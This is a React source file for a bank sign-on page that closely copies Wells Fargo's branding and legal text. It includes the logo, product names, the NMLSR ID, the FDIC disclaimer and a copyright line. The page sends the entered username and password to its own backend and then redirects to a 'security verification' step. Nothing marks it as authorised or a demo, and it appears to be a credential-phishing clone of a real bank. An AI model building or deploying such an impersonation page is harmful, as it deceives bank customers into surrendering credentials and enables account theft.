import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Key, ArrowRight, User, Search, MapPin, ChevronDown, CreditCard, Home, Car, TrendingUp, PiggyBank, Smartphone, Shield, Users, Building2, Headphones, X } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";
import { MobileMenu } from "@/components/mobile-menu";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);
  const [showSaveUsernamePopup, setShowSaveUsernamePopup] = useState(false);
  const [popupDismissed, setPopupDismissed] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
          })) || [],
          userVerification: "preferred",
          timeout: 60000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential as any).rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
          }),
        });

        if (authRes.ok) {
          const authData = await authRes.json();
          toast({
            title: "Biometric Sign On Successful",
            description: "Please complete security verification...",
          });
          sessionStorage.setItem("loginUsername", authData.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      toast({
        title: "Biometric Sign On Failed",
        description: error.name === "NotAllowedError" 
          ? "Biometric authentication was cancelled or not available."
          : "Please try again or use your username and password.",
        variant: "destructive",
      });
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const hasCredentials = form.watch("username") && form.watch("password");
  const watchUsername = form.watch("username");
  const watchPassword = form.watch("password");

  // Show save username popup when both fields are filled
  useEffect(() => {
    if (watchUsername && watchPassword && !popupDismissed) {
      const timer = setTimeout(() => {
        setShowSaveUsernamePopup(true);
      }, 500);
      return () => clearTimeout(timer);
    }
  }, [watchUsername, watchPassword, popupDismissed]);

  const handleSaveUsernameChoice = (save: boolean) => {
    form.setValue("saveUsername", save);
    setShowSaveUsernamePopup(false);
    setPopupDismissed(true);
  };

  // Save Username Popup Component
  const SaveUsernamePopup = () => (
    <Dialog open={showSaveUsernamePopup} onOpenChange={(open) => {
      if (!open) {
        setShowSaveUsernamePopup(false);
        setPopupDismissed(true);
      }
    }}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-xl" style={{ fontFamily: "Georgia, serif" }}>
            Save username?
          </DialogTitle>
          <DialogDescription className="text-base text-gray-600 mt-2">
            To help keep your account secure, save your username only on devices that aren't used by other people.
          </DialogDescription>
        </DialogHeader>
        <div className="flex flex-col gap-3 mt-4">
          <Button
            onClick={() => handleSaveUsernameChoice(true)}
            className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
            data-testid="popup-button-save-username"
          >
            Save username
          </Button>
          <Button
            variant="outline"
            onClick={() => handleSaveUsernameChoice(false)}
            className="w-full h-12 border-2 border-gray-300 text-gray-700 font-semibold rounded hover:bg-gray-50"
            data-testid="popup-button-not-now"
          >
            Not now
          </Button>
        </div>
        <p className="text-xs text-gray-500 mt-4 text-center">
          You can change this preference anytime in your account settings.
        </p>
      </DialogContent>
    </Dialog>
  );

  // Desktop Layout - CSS recreation of Wells Fargo website style
  const DesktopLayout = () => (
    <div className="hidden lg:block min-h-screen bg-[#f5f5f5]">
      {/* Top utility bar */}
      <div className="bg-[#1a1a1a] text-white text-xs">
        <div className="max-w-7xl mx-auto px-4 py-2 flex justify-between items-center">
          <div className="flex items-center gap-6">
            <span className="hover:underline cursor-pointer">Personal</span>
            <span className="hover:underline cursor-pointer">Investing & Wealth Management</span>
            <span className="hover:underline cursor-pointer">Small Business</span>
            <span className="hover:underline cursor-pointer">Commercial Banking</span>
            <span className="hover:underline cursor-pointer">Corporate & Investment Banking</span>
          </div>
          <div className="flex items-center gap-4">
            <span className="hover:underline cursor-pointer flex items-center gap-1">
              <MapPin className="w-3 h-3" /> ATMs/Locations
            </span>
            <span className="hover:underline cursor-pointer flex items-center gap-1">
              <Headphones className="w-3 h-3" /> Contact Us
            </span>
            <span className="hover:underline cursor-pointer">Español</span>
          </div>
        </div>
      </div>

      {/* Main header with logo */}
      <header className="bg-[#d71e28] shadow-md">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          {/* Wells Fargo Logo */}
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 bg-[#ffcd41] rounded-full flex items-center justify-center">
              <div className="text-[#d71e28] font-bold text-lg">W</div>
            </div>
            <div>
              <div className="text-white font-bold text-xl tracking-wide" style={{ fontFamily: "Georgia, serif" }}>
                WELLS FARGO
              </div>
              <div className="text-[#ffcd41] text-[10px] tracking-wider">Established 1852</div>
            </div>
          </div>

          {/* Navigation */}
          <nav className="flex items-center gap-6">
            {[
              { icon: CreditCard, label: "Credit Cards" },
              { icon: Home, label: "Home Loans" },
              { icon: Car, label: "Auto" },
              { icon: PiggyBank, label: "Banking" },
              { icon: TrendingUp, label: "Investing" },
            ].map((item) => (
              <button key={item.label} className="text-white flex items-center gap-1 hover:text-[#ffcd41] transition-colors text-sm">
                <item.icon className="w-4 h-4" />
                {item.label}
                <ChevronDown className="w-3 h-3" />
              </button>
            ))}
          </nav>

          {/* Search and Sign On */}
          <div className="flex items-center gap-4">
            <button className="text-white hover:text-[#ffcd41]">
              <Search className="w-5 h-5" />
            </button>
            <Link href="/register" className="text-white text-sm hover:text-[#ffcd41]">
              Enroll
            </Link>
          </div>
        </div>
      </header>

      {/* Yellow accent line */}
      <div className="h-1 bg-[#ffcd41]"></div>

      {/* Hero Section with Sign On */}
      <section className="bg-gradient-to-br from-[#8B0000] to-[#d71e28] relative overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 py-16 flex items-start justify-between">
          {/* Left side - Hero content */}
          <div className="flex-1 text-white pr-8">
            <h1 className="text-5xl font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
              {greeting}
            </h1>
            <p className="text-xl mb-8 opacity-90">
              Sign on to manage your accounts.
            </p>
            <div className="flex gap-4 mt-8">
              <div className="bg-white/10 backdrop-blur rounded-lg p-6 w-64">
                <CreditCard className="w-8 h-8 text-[#ffcd41] mb-3" />
                <h3 className="text-lg font-semibold mb-2">Active Cash Card</h3>
                <p className="text-sm opacity-80">Earn unlimited 2% cash rewards on purchases.</p>
              </div>
              <div className="bg-white/10 backdrop-blur rounded-lg p-6 w-64">
                <PiggyBank className="w-8 h-8 text-[#ffcd41] mb-3" />
                <h3 className="text-lg font-semibold mb-2">Way2Save Savings</h3>
                <p className="text-sm opacity-80">Build your savings automatically with each purchase.</p>
              </div>
            </div>
          </div>

          {/* Right side - Sign On Form */}
          <div className="w-[340px] bg-white rounded-lg shadow-xl p-6">
            <h2 className="text-2xl text-[#1a1a1a] mb-1" style={{ fontFamily: "Georgia, serif" }}>
              Sign On
            </h2>
            <p className="text-sm text-gray-600 mb-4">to access your accounts</p>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="username"
                  render={({ field }) => (
                    <FormItem>
                      <FormControl>
                        <Input
                          placeholder="Username"
                          autoComplete="username"
                          className="h-12 px-4 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                          data-testid="desktop-input-username"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormControl>
                        <div className="relative">
                          <Input
                            type={showPassword ? "text" : "password"}
                            placeholder="Password"
                            autoComplete="current-password"
                            className="h-12 px-4 pr-16 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                            data-testid="desktop-input-password"
                            {...field}
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium text-sm underline"
                          >
                            {showPassword ? "Hide" : "Show"}
                          </button>
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <Button
                  type="submit"
                  className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded text-base"
                  disabled={loginMutation.isPending}
                  data-testid="desktop-button-sign-on"
                >
                  {loginMutation.isPending ? "Signing on..." : "Sign On"}
                </Button>

                <div className="flex items-center justify-center gap-2 py-2">
                  <span className="text-gray-400 text-sm">or</span>
                </div>

                <Button
                  type="button"
                  variant="outline"
                  className="w-full h-12 rounded border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
                  onClick={handleBiometricLogin}
                  disabled={biometricLoading}
                  data-testid="desktop-button-passkey"
                >
                  <User className="w-5 h-5 mr-2" />
                  {biometricLoading ? "Authenticating..." : "Use a passkey"}
                </Button>
              </form>
            </Form>

            <div className="mt-4 pt-4 border-t border-gray-200 space-y-2">
              <Link href="/forgot-password" className="text-[#6b21a8] text-sm hover:underline flex items-center gap-1">
                <ArrowRight className="w-3 h-3" /> Forgot username or password?
              </Link>
              <Link href="/security" className="text-[#6b21a8] text-sm hover:underline flex items-center gap-1">
                <ArrowRight className="w-3 h-3" /> Security Center
              </Link>
            </div>
          </div>
        </div>

        {/* Decorative wave */}
        <div className="absolute bottom-0 left-0 right-0 h-16 bg-[#f5f5f5]" style={{
          clipPath: "ellipse(60% 100% at 50% 100%)"
        }}></div>
      </section>

      {/* Special Offers Section */}
      <section className="bg-[#f5f5f5] py-12">
        <div className="max-w-7xl mx-auto px-4">
          <h2 className="text-3xl text-[#1a1a1a] mb-8" style={{ fontFamily: "Georgia, serif" }}>
            Special offers for you
          </h2>
          <div className="grid grid-cols-3 gap-6">
            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
              <div className="h-40 bg-gradient-to-br from-[#1a4d2e] to-[#2d7a4a] flex items-center justify-center">
                <CreditCard className="w-16 h-16 text-white" />
              </div>
              <div className="p-6">
                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Active Cash Card</h3>
                <p className="text-sm text-gray-600 mb-4">Earn unlimited 2% cash rewards on purchases. No annual fee.</p>
                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Learn more</button>
              </div>
            </div>
            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
              <div className="h-40 bg-gradient-to-br from-[#0d3b66] to-[#1a5f9e] flex items-center justify-center">
                <Home className="w-16 h-16 text-white" />
              </div>
              <div className="p-6">
                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Home Mortgage</h3>
                <p className="text-sm text-gray-600 mb-4">Get pre-approved in minutes. Competitive rates available.</p>
                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Get started</button>
              </div>
            </div>
            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
              <div className="h-40 bg-gradient-to-br from-[#4a1c6b] to-[#7b2d9e] flex items-center justify-center">
                <TrendingUp className="w-16 h-16 text-white" />
              </div>
              <div className="p-6">
                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Invest with us</h3>
                <p className="text-sm text-gray-600 mb-4">Build your portfolio with expert guidance and tools.</p>
                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Explore options</button>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Savings Section */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-4 flex items-center gap-12">
          <div className="flex-1">
            <div className="text-[#d71e28] text-sm font-semibold mb-2">SAVINGS</div>
            <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
              Grow your savings with competitive rates
            </h2>
            <p className="text-gray-600 mb-6">
              Open a savings account and start building toward your goals. Earn interest on your balance with no minimum deposit required.
            </p>
            <button className="bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold px-6 py-3 rounded">
              Open an account
            </button>
          </div>
          <div className="w-96 h-64 bg-gradient-to-br from-[#ffcd41] to-[#e6b938] rounded-lg flex items-center justify-center">
            <PiggyBank className="w-32 h-32 text-white" />
          </div>
        </div>
      </section>

      {/* Financial Guidance Section */}
      <section className="bg-[#1a1a1a] py-12 text-white">
        <div className="max-w-7xl mx-auto px-4">
          <h2 className="text-3xl mb-8" style={{ fontFamily: "Georgia, serif" }}>
            Financial guidance for every stage of life
          </h2>
          <div className="grid grid-cols-4 gap-6">
            {[
              { icon: Shield, title: "Security Center", desc: "Protect your accounts" },
              { icon: Users, title: "Family Banking", desc: "Teach kids about money" },
              { icon: Building2, title: "Small Business", desc: "Grow your business" },
              { icon: TrendingUp, title: "Retirement", desc: "Plan for the future" },
            ].map((item) => (
              <div key={item.title} className="bg-white/10 rounded-lg p-6 hover:bg-white/20 transition-colors cursor-pointer">
                <item.icon className="w-10 h-10 text-[#ffcd41] mb-4" />
                <h3 className="text-lg font-semibold mb-2">{item.title}</h3>
                <p className="text-sm opacity-80">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Mobile App Section */}
      <section className="bg-[#f5f5f5] py-12">
        <div className="max-w-7xl mx-auto px-4 flex items-center gap-12">
          <div className="w-64 h-96 bg-gradient-to-b from-[#d71e28] to-[#8B0000] rounded-3xl flex items-center justify-center shadow-xl">
            <Smartphone className="w-24 h-24 text-white" />
          </div>
          <div className="flex-1">
            <div className="text-[#d71e28] text-sm font-semibold mb-2">WELLS FARGO MOBILE</div>
            <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
              Bank anytime, anywhere
            </h2>
            <p className="text-gray-600 mb-6">
              Manage your accounts, pay bills, transfer money, and deposit checks right from your phone.
            </p>
            <div className="flex gap-4">
              <button className="bg-[#1a1a1a] text-white px-6 py-3 rounded font-semibold">
                App Store
              </button>
              <button className="bg-[#1a1a1a] text-white px-6 py-3 rounded font-semibold">
                Google Play
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Community Section */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
            Committed to our communities
          </h2>
          <p className="text-gray-600 mb-8 max-w-2xl mx-auto">
            We're dedicated to helping communities thrive through financial education, affordable housing, and small business support.
          </p>
          <button className="border-2 border-[#d71e28] text-[#d71e28] font-semibold px-6 py-3 rounded hover:bg-[#d71e28] hover:text-white transition-colors">
            Learn about our impact
          </button>
        </div>
      </section>

      {/* Desktop Footer */}
      <footer className="bg-[#1a1a1a] text-white py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid grid-cols-5 gap-8 mb-8">
            <div>
              <h4 className="font-semibold mb-4">About Wells Fargo</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer">Careers</li>
                <li className="hover:text-white cursor-pointer">Investor Relations</li>
                <li className="hover:text-white cursor-pointer">Newsroom</li>
                <li className="hover:text-white cursor-pointer">Who We Are</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Banking</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer">Checking</li>
                <li className="hover:text-white cursor-pointer">Savings</li>
                <li className="hover:text-white cursor-pointer">CDs</li>
                <li className="hover:text-white cursor-pointer">Money Market</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Credit Cards</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer">Cash Back</li>
                <li className="hover:text-white cursor-pointer">Rewards</li>
                <li className="hover:text-white cursor-pointer">Low Interest</li>
                <li className="hover:text-white cursor-pointer">Business</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Loans</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer">Home Loans</li>
                <li className="hover:text-white cursor-pointer">Auto Loans</li>
                <li className="hover:text-white cursor-pointer">Personal Loans</li>
                <li className="hover:text-white cursor-pointer">Student Loans</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Help</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer">FAQs</li>
                <li className="hover:text-white cursor-pointer">Contact Us</li>
                <li className="hover:text-white cursor-pointer">Security Center</li>
                <li className="hover:text-white cursor-pointer">Report Fraud</li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-700 pt-8">
            <div className="flex justify-between items-center text-xs text-gray-400">
              <div className="flex gap-4">
                <span className="hover:text-white cursor-pointer">Privacy Policy</span>
                <span className="hover:text-white cursor-pointer">Terms of Use</span>
                <span className="hover:text-white cursor-pointer">Report Fraud</span>
                <span className="hover:text-white cursor-pointer">Security</span>
                <span className="hover:text-white cursor-pointer">Accessibility</span>
              </div>
              <div>
                © 2024 Wells Fargo. All rights reserved. NMLSR ID 399801
              </div>
            </div>
            <p className="text-xs text-gray-500 mt-4">
              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
            </p>
          </div>
        </div>
      </footer>
    </div>
  );

  // Mobile Layout (phones and tablets - below lg: breakpoint)
  const MobileLayout = () => (
    <div className="lg:hidden min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-[#d71e28] px-4 py-3 md:py-4 flex items-center justify-between">
        <div className="flex-1"></div>
        <h1 
          className="text-white text-xl md:text-2xl tracking-wide font-bold"
          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
        >
          WELLS FARGO
        </h1>
        <div className="flex-1 flex justify-end">
          <MobileMenu />
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="h-1.5 md:h-2 bg-[#ffcd41]"></div>

      {/* Main Content - Centered container for larger screens */}
      <main className="flex-1 flex justify-center">
        <div className="w-full max-w-md px-5 py-8 md:py-12">
          {/* Greeting - Centered */}
          <h2 
            className="text-3xl md:text-4xl text-[#1a1a1a] mb-8 text-center"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
            data-testid="text-greeting"
          >
            {greeting}
          </h2>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            {/* Username Input */}
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Username"
                      autoComplete="username"
                      autoCapitalize="off"
                      autoCorrect="off"
                      spellCheck={false}
                      className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                      data-testid="input-username"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Password Input */}
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="Password"
                        autoComplete="current-password"
                        className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                        data-testid="input-password"
                        {...field}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline text-sm"
                        data-testid="button-toggle-password"
                      >
                        {showPassword ? "Hide" : "Show"}
                      </button>
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Sign On Button */}
            <div className="pt-4">
              <Button
                type="submit"
                className={`w-full h-14 font-semibold rounded-full text-lg transition-all ${
                  hasCredentials 
                    ? "bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a]" 
                    : "bg-[#e5e5e5] text-gray-400 cursor-not-allowed"
                }`}
                disabled={loginMutation.isPending || !hasCredentials}
                data-testid="button-sign-on"
              >
                {loginMutation.isPending ? "Signing on..." : "Sign on"}
              </Button>
            </div>

            {/* Or divider */}
            <div className="flex items-center justify-center py-3">
              <span className="text-gray-500 text-base">or</span>
            </div>

            {/* Use a passkey button */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-14 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
              data-testid="button-passkey"
              onClick={handleBiometricLogin}
              disabled={biometricLoading}
            >
              <User className="w-5 h-5 mr-2" />
              {biometricLoading ? "Authenticating..." : "Use a passkey"}
            </Button>

            {/* Passkey info */}
            <p className="text-sm text-gray-600 text-center leading-snug mt-2">
              Don't have one? Create a passkey after signing on and skip the password next time.
            </p>
          </form>
        </Form>

        {/* Forgot link */}
        <div className="mt-8 flex items-center gap-2">
          <ArrowRight className="w-4 h-4 text-[#d71e28]" />
          <Link 
            href="/forgot-password" 
            className="text-[#6b21a8] font-medium hover:underline"
            data-testid="link-forgot"
          >
            Forgot username or password?
          </Link>
        </div>

        {/* Enroll section */}
        <div className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between">
            <span className="text-base text-gray-700">New to Wells Fargo?</span>
            <Link 
              href="/register" 
              className="text-[#d71e28] font-bold flex items-center gap-1 hover:underline"
              data-testid="link-register"
            >
              Enroll Now
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </div>

        {/* Security Notice */}
        <div className="mt-8 pt-6 border-t border-gray-200">
          <p className="text-xs text-gray-500 leading-relaxed text-center">
            Your security is important to us. Wells Fargo uses 128-bit Secure Sockets Layer (SSL) encryption to protect your personal information. Never share your password with anyone. Wells Fargo will never ask for your password via email, phone, or text message.
          </p>
        </div>
        </div>
      </main>

      <OfficialFooter />
    </div>
  );

  return (
    <div className="relative">
      <DesktopLayout />
      <MobileLayout />
      <SaveUsernamePopup />
    </div>
  );
}
